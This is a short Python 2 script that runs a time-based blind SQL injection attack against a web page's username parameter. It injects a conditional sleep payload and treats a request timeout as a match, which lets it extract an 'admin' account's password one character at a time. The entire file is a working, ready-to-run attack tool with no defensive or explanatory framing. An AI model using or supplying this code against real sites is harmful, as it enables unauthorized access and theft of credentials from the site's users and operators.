import requests
 
#Sample character set
characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
 

#Sample parameters
username = 'admin'
password_length = 12
sleepTime = '5'
requestTimeOut = 1
 
 
#FatalityPunction
def letBlind (url):
    r = requests.get(url)
    if r.status_code != requests.codes.ok:
            raise ValueError('[!] Connection to Website Refused')
    else:
            print '[+] Connection to Website Successful'
    print '[+] Starting Blind SQL Injection Testing'
    foundChars = ''
    for i in range(password_length):
        for c in characters:
            try:
                blindSql = '?username='+username+'" AND IF(password like BINARY "'+foundChars+c+'%",sleep('+sleepTime+'),null)"'
                r = requests.get(url+blindSql,timeout=requestTimeOut)
            except requests.exceptions.Timeout:
                foundChars += c
                print '[+] Found chars in password: ' + foundChars
                break